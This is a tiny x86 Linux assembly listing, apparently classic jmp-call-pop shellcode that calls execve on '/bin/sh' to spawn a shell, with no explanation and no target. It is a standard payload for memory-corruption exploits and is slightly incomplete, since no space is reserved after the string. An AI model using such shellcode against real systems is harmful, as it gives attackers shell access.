section .data
global _start
_start:

jmp sh
do:

xor eax, eax
pop ebx
lea ecx, [ebx+8]
lea edx, [ebx+12]
mov [ebx+7], al
mov [ecx], ebx
mov [edx], eax
mov al, 11
int 0x80

sh:
  call do
  db '/bin/sh'
  
